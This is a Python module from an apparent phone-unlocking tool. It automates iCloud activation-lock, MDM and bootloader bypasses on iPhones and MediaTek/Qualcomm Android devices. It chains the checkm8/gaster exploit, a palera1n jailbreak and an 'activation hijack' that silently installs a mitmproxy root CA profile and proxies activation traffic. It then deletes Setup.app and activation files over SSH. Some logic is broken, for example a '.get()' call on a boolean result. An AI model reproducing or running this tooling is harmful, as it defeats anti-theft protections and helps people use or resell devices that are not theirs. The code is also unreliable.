"""
AutoUnlocker_NoAPI.py — Refactored Master Script (Queue-Aware)
This module is called by engine.py. Instead of printing directly,
all output is sent through a queue.Queue as structured event dicts.

Event structure:
    {
        "level":   "INFO" | "SUCCESS" | "WARNING" | "ERROR",
        "stage":   "DETECTION" | "EXPLOIT" | "BYPASS" | "PROXY" | "FINALIZE",
        "message": str,
        "device":  dict | None   (model, sn, version, chipset, platform)
    }
"""

import os
import subprocess
import queue
import time
from typing import Optional
from config import BUILD_DIR, MDM_TOOL, MEOW_TOOL, MTK_MODULE


def _emit(q: queue.Queue, level: str, stage: str, message: str, device: Optional[dict] = None):
    """Push a structured log event onto the shared queue."""
    q.put_nowait({
        "level": level,
        "stage": stage,
        "message": message,
        "device": device,
    })


def _run_action(q: queue.Queue, name: str, command: str, stage: str, device: dict) -> bool:
    """Execute a shell command and stream its stdout/stderr into the queue."""
    _emit(q, "INFO", stage, f"▶ Executing: {name}", device)
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        for line in proc.stdout:
            line = line.strip()
            if line:
                _emit(q, "INFO", stage, f"  {line}", device)
        proc.wait()
        if proc.returncode == 0:
            _emit(q, "SUCCESS", stage, f"✅ {name} — completed successfully", device)
            return True
        else:
            _emit(q, "ERROR", stage, f"❌ {name} — exited with code {proc.returncode}", device)
            return False
    except Exception as e:
        _emit(q, "ERROR", stage, f"❌ {name} — exception: {e}", device)
        return False


# ---------------------------------------------------------------------------
# Device Detection
# ---------------------------------------------------------------------------

def get_ios_device_info(q: queue.Queue) -> Optional[dict]:
    """Query ideviceinfo or lsusb for connected iOS device. Returns None if not found."""
    try:
        # 1. Check for DFU or Recovery mode via lsusb
        lsusb = subprocess.check_output(["lsusb"], stderr=subprocess.DEVNULL, timeout=5).decode()
        if "05ac:1227" in lsusb.lower() or "dfu mode" in lsusb.lower():
            return {
                "platform": "ios",
                "model": "iPhone (DFU Mode)",
                "version": "Unknown",
                "serial": "DFU_DEVICE",
                "chipset": "Unknown",
                "connection": "usb",
            }
        if "05ac:1281" in lsusb.lower() or "recovery mode" in lsusb.lower():
            return {
                "platform": "ios",
                "model": "iPhone (Recovery Mode)",
                "version": "Unknown",
                "serial": "RECOVERY_DEVICE",
                "chipset": "Unknown",
                "connection": "usb",
            }

        # 2. Check for Normal mode devices
        # Even if locked, idevice_id -l returns the UDID
        ids = subprocess.check_output(["idevice_id", "-l"], stderr=subprocess.DEVNULL, timeout=5).decode().strip().split()
        if not ids:
            return None
        
        udid = ids[0]
        
        # Try to get detailed info
        def query(key):
            return subprocess.check_output(
                ["ideviceinfo", "-u", udid, "-k", key],
                stderr=subprocess.DEVNULL, timeout=5,
            ).decode().strip()

        try:
            model = query("ProductType")
            version = query("ProductVersion")
            sn = query("SerialNumber")
            cpu = query("CPUArchitecture")
            return {
                "platform": "ios",
                "model": model,
                "version": version,
                "serial": sn,
                "chipset": cpu,
                "connection": "usb",
            }
        except Exception:
            # Device is connected but locked/untrusted (Trust dialog not accepted)
            return {
                "platform": "ios",
                "model": "iPhone (Locked/Untrusted)",
                "version": "Unknown",
                "serial": udid[:12] + "...",
                "chipset": "Unknown",
                "connection": "usb",
            }

    except Exception:
        return None


def get_android_device_info(q: queue.Queue) -> Optional[dict]:
    """Detect MediaTek or Qualcomm Android devices via lsusb."""
    try:
        lsusb = subprocess.check_output(["lsusb"], stderr=subprocess.DEVNULL, timeout=5).decode()
        if "0e8d:" in lsusb:    # MediaTek VID
            return {"platform": "android", "chipset": "MediaTek", "model": "Android/MTK",
                    "serial": "N/A", "version": "N/A", "connection": "local"}
        if "05c6:" in lsusb:    # Qualcomm VID
            return {"platform": "android", "chipset": "Qualcomm/EDL", "model": "Android/QC",
                    "serial": "N/A", "version": "N/A", "connection": "local"}
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# iOS Unlock Pipelines
# ---------------------------------------------------------------------------

def pipeline_checkm8(q: queue.Queue, device: dict) -> bool:
    """Full unlock pipeline for A11 and older (Checkm8-vulnerable)."""
    _emit(q, "INFO", "EXPLOIT", "🔓 Checkm8 pipeline selected (A11/iPhone 8–X)", device)

    ok = _run_action(q, "Gaster Pwn — DFU exploit", "gaster pwn", "EXPLOIT", device)
    if not ok:
        return False

    ok = _run_action(q, "Palera1n — Jailbreak", "palera1n -c --force-revert", "EXPLOIT", device)
    if not ok:
        return False

    _run_action(q, "SSH Mount via palera1n", "palera1n --boot-args serial=3", "BYPASS", device)

    ok = _run_action(
        q, "iCloud Bypass — Meow Activator",
        f"python3 {MEOW_TOOL}", "BYPASS", device
    )

    _run_action(q, "Reboot device", "idevicediagnostics restart", "FINALIZE", device)
    return ok


def pipeline_mdm_bypass(q: queue.Queue, device: dict) -> bool:
    """MDM / Activation bypass for A12+ devices (no exploit)."""
    _emit(q, "INFO", "BYPASS", "🛡️ MDM Bypass pipeline selected (A12+)", device)

    # ── Étape 1 : Paire l'appareil ─────────────────────────────────────────
    _run_action(q, "iDevice Pair", "/usr/bin/idevicepair pair", "BYPASS", device)

    # ── Étape 2 : Tentative MDM Bypass rapide (via mdm_patcher) ──────────────
    res = _run_action(q, "MDM Patcher", "python3 /opt/unlockos/dashboard/MDMPatcher-Enhanced/mdm_patcher.py --bypass", "BYPASS", device)
    
    if res and res.get("success"):
        _emit(q, "SUCCESS", "BYPASS", "✅ MDM Bypass rapide reussi !", device)
        return True
    else:
        _emit(q, "ERROR", "BYPASS", "❌ MDM Bypass echoue ou outils manquants.", device)
        _emit(q, "WARNING", "BYPASS", "⚠ Escalation vers Proxy Activation Hijack...", device)
        
        # Cleanup avant escalation
        _run_action(q, "Profile Cleanup", "/usr/bin/idevicepair pair && /usr/bin/idevicediagnostics restart", "BYPASS", device)
    
    # On retourne False pour indiquer au moteur de passer a la methode suivante (Proxy)
    return False


def pipeline_proxy_hijack(q: queue.Queue, device: dict,
                          proxy_starter=None) -> bool:
    """
    Fully automated Proxy Activation Hijack pipeline for A12+ devices.

    Steps (all automatic, zero manual interaction):
      1. Auto-start mitmdump in background (via proxy_starter callback or directly)
      2. Install mitmproxy CA cert on the device via USB
      3. Configure device HTTP proxy via idevicesetproxy (USB — no Wi-Fi setup needed)
      4. Poll activation state until success or timeout
    """
    import threading

    _emit(q, "INFO", "PROXY", "🌐 Pipeline Proxy Activation Hijack — démarrage automatique", device)

    # ── Étape 1 : Démarrer mitmdump automatiquement ──────────────────────────
    _emit(q, "INFO", "PROXY", "⏳ Démarrage automatique du serveur proxy (mitmdump)...", device)

    proxy_started = False
    if proxy_starter is not None:
        # Called from engine.py which manages the subprocess
        proxy_started = proxy_starter()
    else:
        # Standalone fallback: start mitmdump directly
        import os, sys
        script_dir = os.path.dirname(os.path.abspath(__file__))
        hijack_script = os.path.join(script_dir, "activation_hijack.py")
        try:
            _proxy_proc = subprocess.Popen(
                ["mitmdump", "-s", hijack_script, "-p", "8080",
                 "--quiet", "--no-http2", "--ssl-insecure"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(2)  # Give mitmdump time to bind
            proxy_started = _proxy_proc.poll() is None
            if proxy_started:
                _emit(q, "SUCCESS", "PROXY",
                      f"✅ mitmdump démarré (PID {_proxy_proc.pid}, port 8080)", device)
            else:
                _emit(q, "WARNING", "PROXY",
                      "⚠  mitmdump s'est arrêté immédiatement — vérifiez l'installation", device)
        except FileNotFoundError:
            _emit(q, "ERROR", "PROXY",
                  "❌ mitmdump introuvable — installez: pip3 install mitmproxy", device)

    if not proxy_started:
        _emit(q, "WARNING", "PROXY",
              "⚠  Proxy non démarré — poursuite avec configuration USB uniquement", device)

    # ── Étape 2 : Installer le certificat mitmproxy CA sur l'appareil ────────
    # mitmproxy génère son CA dans ~/.mitmproxy/mitmproxy-ca-cert.pem
    import os, platform
    cert_path = os.path.expanduser("~/.mitmproxy/mitmproxy-ca-cert.pem")

    if os.path.exists(cert_path):
        _emit(q, "INFO", "PROXY",
              "🔐 Installation automatique du certificat CA mitmproxy sur l'appareil...", device)

        # ideviceinstaller peut installer des profils .mobileconfig
        # On crée un profil de confiance minimal autour du cert PEM
        profile_path = "/tmp/unlockos_ca_profile.mobileconfig"
        _generate_mobileconfig_profile(cert_path, profile_path)

        ok_cert = _run_action(
            q, "Install CA cert profile (mobileconfig)",
            f"ideviceinstaller -i {profile_path}",
            "PROXY", device
        )
        if not ok_cert:
            _emit(q, "WARNING", "PROXY",
                  "⚠  Cert auto-install échoué — l'iPhone devra valider manuellement "
                  "ou utiliser SSL stripping", device)
    else:
        # Certificat pas encore généré — mitmdump le crée au 1er run
        _emit(q, "INFO", "PROXY",
              "ℹ  Certificat CA non trouvé (~/.mitmproxy/) — "
              "mitmdump le créera au premier démarrage.", device)

    # ── Étape 3 : Configurer le proxy via USB (idevicesetproxy) ─────────────
    # Pas besoin de configurer le Wi-Fi manuellement — USB suffit
    _emit(q, "INFO", "PROXY",
          "🔌 Configuration automatique du proxy via USB (/usr/local/bin/idevicesetproxy)...", device)

    ok_proxy = _run_action(
        q, "Configurer proxy HTTP → 127.0.0.1:8080 (via USB)",
        "/usr/local/bin/idevicesetproxy 127.0.0.1 8080",
        "PROXY", device
    )

    if ok_proxy:
        _emit(q, "SUCCESS", "PROXY",
              "✅ Proxy configuré automatiquement — aucune action Wi-Fi requise sur l'iPhone", device)
    else:
        _emit(q, "WARNING", "PROXY",
              "⚠  /usr/local/bin/idevicesetproxy indisponible — "
              "configurez manuellement: Réglages → Wi-Fi → Proxy → 127.0.0.1:8080", device)

    # ── Étape 4 : Activation Automatique via USB (Simulation O.MG Cable) ─────
    _emit(q, "INFO", "PROXY",
          "🤖 Démarrage de l'activation USB automatisée (Simulation O.MG)...", device)
    
    # Exécuter ideviceactivation en forçant le passage par le proxy local
    ok_activation = _run_action(
        q, "USB Automated Activation (ideviceactivation)",
        "env HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080 ideviceactivation activate",
        "PROXY", device
    )

    if ok_activation:
        _emit(q, "SUCCESS", "PROXY",
              "✅ iPhone activé avec succès via USB (Payload injecté) !", device)
        activation_confirmed = True
    else:
        _emit(q, "WARNING", "PROXY",
              "⚠  L'activation automatique USB a échoué. "
              "Attente de l'activation manuelle (timeout: 120s)...", device)
        
        # Fallback au polling manuel
        max_wait = 120
        poll_interval = 5
        elapsed = 0
        activation_confirmed = False

        while elapsed < max_wait:
            time.sleep(poll_interval)
            elapsed += poll_interval

            try:
                act_state = subprocess.check_output(
                    ["/usr/bin/ideviceinfo", "-k", "ActivationState"],
                    stderr=subprocess.DEVNULL, timeout=5
                ).decode().strip()

                _emit(q, "INFO", "PROXY",
                      f"  ActivationState: {act_state} ({elapsed}s/{max_wait}s)", device)

                if act_state in ("Activated", "MobileActivated"):
                    activation_confirmed = True
                    break
            except Exception:
                _emit(q, "INFO", "PROXY",
                      f"  Attente activation... ({elapsed}s/{max_wait}s)", device)

    if activation_confirmed:
        # ── Nettoyage Profond (Deep Cleanup) inspiré par tr4mpass ──────────
        _emit(q, "INFO", "PROXY", "🧹 Exécution du nettoyage profond des traces iCloud...", device)
        cleanup_cmds = [
            "/usr/local/bin/idevicesetproxy --disable",
            "/usr/bin/idevicepair pair",
            "ssh root@localhost 'rm -rf /Applications/Setup.app' 2>/dev/null",
            "ssh root@localhost 'rm -rf /private/var/mobile/Library/FairPlay' 2>/dev/null",
            "ssh root@localhost 'rm -rf /private/var/mobile/Library/Caches/com.apple.activationd' 2>/dev/null"
        ]
        for cmd in cleanup_cmds:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)

        return True
    else:
        _emit(q, "WARNING", "PROXY",
              "⚠  Timeout / Échec — activation non confirmée. "
              "Le proxy continue de tourner en arrière-plan.", device)
        return False


def _generate_mobileconfig_profile(cert_pem_path: str, output_path: str) -> None:
    """
    Génère un profil .mobileconfig Apple permettant d'installer
    le certificat CA mitmproxy comme autorité de confiance sur iOS.
    """
    import base64, uuid
    with open(cert_pem_path, "rb") as f:
        cert_data = f.read()

    # Extraire uniquement le bloc DER en base64
    cert_b64_lines = []
    inside = False
    for line in cert_data.decode().splitlines():
        if "BEGIN CERTIFICATE" in line:
            inside = True
            continue
        if "END CERTIFICATE" in line:
            break
        if inside:
            cert_b64_lines.append(line.strip())
    cert_b64 = "".join(cert_b64_lines)

    profile_uuid = str(uuid.uuid4()).upper()
    payload_uuid = str(uuid.uuid4()).upper()

    mobileconfig = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadCertificateFileName</key>
      <string>UnlockOS-MitmProxy-CA.cer</string>
      <key>PayloadContent</key>
      <data>{cert_b64}</data>
      <key>PayloadDescription</key>
      <string>UnlockOS Proxy CA Certificate</string>
      <key>PayloadDisplayName</key>
      <string>UnlockOS Proxy CA</string>
      <key>PayloadIdentifier</key>
      <string>com.unlockos.proxy.ca.{payload_uuid}</string>
      <key>PayloadType</key>
      <string>com.apple.security.root</string>
      <key>PayloadUUID</key>
      <string>{payload_uuid}</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Certificat proxy UnlockOS pour interception activation</string>
  <key>PayloadDisplayName</key>
  <string>UnlockOS Proxy CA</string>
  <key>PayloadIdentifier</key>
  <string>com.unlockos.proxy.{profile_uuid}</string>
  <key>PayloadRemovalDisallowed</key>
  <false/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>{profile_uuid}</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</dict>
</plist>"""

    with open(output_path, "w") as f:
        f.write(mobileconfig)


def pipeline_recovery(q: queue.Queue, device: dict) -> bool:
    """Automated Recovery Mode Exit."""
    _emit(q, "INFO", "DETECTION", "⚙️ Appareil en Mode Recovery detecte. Tentative de sortie automatique...", device)
    
    ok = _run_action(q, "Exit Recovery Mode", "irecovery -n", "DETECTION", device)
    if ok:
        _emit(q, "SUCCESS", "DETECTION", "✅ Commande de sortie envoyee. L'appareil va redemarrer.", device)
        _emit(q, "INFO", "DETECTION", "⏳ Veuillez patienter 1-2 minutes. Le deblocage reprendra automatiquement au rallumage.", device)
        time.sleep(10)
        return True
    else:
        _emit(q, "ERROR", "DETECTION", "❌ Echec de la sortie automatique. Restaurez le systeme iOS via iTunes.", device)
        return False

# ---------------------------------------------------------------------------
# Android Unlock Pipelines
# ---------------------------------------------------------------------------

def pipeline_mtk_unlock(q: queue.Queue, device: dict) -> bool:
    """Bypass AUTH + unlock bootloader for MediaTek devices."""
    _emit(q, "INFO", "EXPLOIT", "🤖 MTKClient pipeline selected (MediaTek)", device)

    ok = _run_action(
        q, "MTK Auth Bypass",
        f"python3 -m {MTK_MODULE} payload-bypass", "EXPLOIT", device
    )
    if not ok:
        return False

    ok = _run_action(
        q, "MTK Bootloader Unlock",
        f"python3 -m {MTK_MODULE} stage2 unlock", "BYPASS", device
    )
    return ok


def pipeline_edl_unlock(q: queue.Queue, device: dict) -> bool:
    """Qualcomm EDL unlock via bkerler/edl."""
    _emit(q, "INFO", "EXPLOIT", "🤖 EDL pipeline selected (Qualcomm)", device)
    ok = _run_action(q, "EDL Unlock", "python3 -m edl reset", "EXPLOIT", device)
    return ok


# ---------------------------------------------------------------------------
# Backup / Ticket Saving
# ---------------------------------------------------------------------------

def save_activation_tickets(q: queue.Queue, device: dict) -> None:
    """Backup activation tickets for future reference."""
    backup_dir = os.path.join(os.path.expanduser("~"), "UnlockOS_Backups",
                              device.get("serial", "unknown"))
    os.makedirs(backup_dir, exist_ok=True)
    _run_action(
        q, "Save Activation Tickets",
        f"idevicebackup2 backup --full {backup_dir}",
        "FINALIZE", device
    )


# ---------------------------------------------------------------------------
# Main Decision Router
# ---------------------------------------------------------------------------

def run_unlock_pipeline(q: queue.Queue, device: dict) -> tuple[bool, str]:
    """
    Select and execute the appropriate unlock pipeline.
    Returns (success: bool, method_name: str)
    """
    platform = device.get("platform", "ios")

    if platform == "android":
        chipset = device.get("chipset", "")
        if "MediaTek" in chipset:
            return pipeline_mtk_unlock(q, device), "mtk_unlock"
        elif "Qualcomm" in chipset:
            return pipeline_edl_unlock(q, device), "edl_unlock"
        else:
            _emit(q, "WARNING", "DETECTION",
                  f"⚠  Unknown Android chipset: {chipset}. No pipeline available.", device)
            return False, "unknown"

    # iOS routing
    model = device.get("model", "")
    _emit(q, "INFO", "DETECTION",
          f"📱 iOS device identified: {model} | iOS {device.get('version','?')} | "
          f"CPU: {device.get('chipset','?')}", device)

    # Recovery Mode → Auto-Exit
    if "Recovery Mode" in model:
        _emit(q, "INFO", "DETECTION",
              "🎯 Périphérique bloqué en Recovery. Démarrage de la séquence d'auto-réparation.", device)
        return pipeline_recovery(q, device), "recovery_exit"

    # A11 and below → Checkm8
    CHECKM8_MODELS = [
        "iPhone10,",   # iPhone 8, 8 Plus, X
        "iPhone9,",    # iPhone 7, 7 Plus
        "iPhone8,",    # iPhone 6s, 6s Plus, SE1
        "iPad",        # many iPads
    ]
    if any(m in model for m in CHECKM8_MODELS):
        _emit(q, "INFO", "DETECTION",
              "🎯 Checkm8-vulnerable device confirmed (A11 or older)", device)
        return pipeline_checkm8(q, device), "checkm8"

    # A12+ → MDM Bypass first, proxy as fallback
    _emit(q, "INFO", "DETECTION",
          "🔍 A12+ device. Attempting MDM Bypass (No-API)...", device)
    success = pipeline_mdm_bypass(q, device)
    if success:
        return True, "mdm_bypass"

    _emit(q, "WARNING", "BYPASS",
          "⚠  MDM Bypass insufficient. Escalating to Proxy Activation Hijack...", device)
    success = pipeline_proxy_hijack(q, device)
    return success, "proxy_hijack"
